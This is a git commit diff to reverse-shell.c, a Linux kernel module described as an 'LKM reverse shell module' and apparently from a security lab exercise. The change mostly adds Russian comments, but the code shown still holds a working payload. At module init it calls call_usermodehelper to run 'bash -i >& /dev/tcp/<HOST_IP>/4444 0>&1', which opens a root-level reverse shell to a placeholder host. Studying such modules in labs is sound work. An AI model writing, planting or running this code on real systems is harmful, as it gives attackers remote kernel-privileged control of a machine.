df041857fcf50093426044961dba748920e8e511
Simonovav23 <76959672+Simonovav23@users.noreply.github.com>
2024-10-22 23:14:36 +0300

    Update reverse-shell.c

--- reverse-shell.c
+++ reverse-shell.c
@@ -5,12 +5,11 @@ MODULE_AUTHOR("AttackDefense");
 MODULE_DESCRIPTION("LKM reverse shell module");
 MODULE_VERSION("1.0");
 
-char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/<HOST_IP>/4444 0>&1", NULL};
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/<HOST_IP>/4444 0>&1", NULL}; //переменные для создания обратной оболочки
 static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
 
-// call_usermodehelper function is used to create user mode processes from kernel space
-static int __init reverse_shell_init(void) {
-    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+static int __init reverse_shell_init(void) { //функция иницализации 
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); //запуск процесса из пространства пользователя
 }
 
 static void __exit reverse_shell_exit(void) {
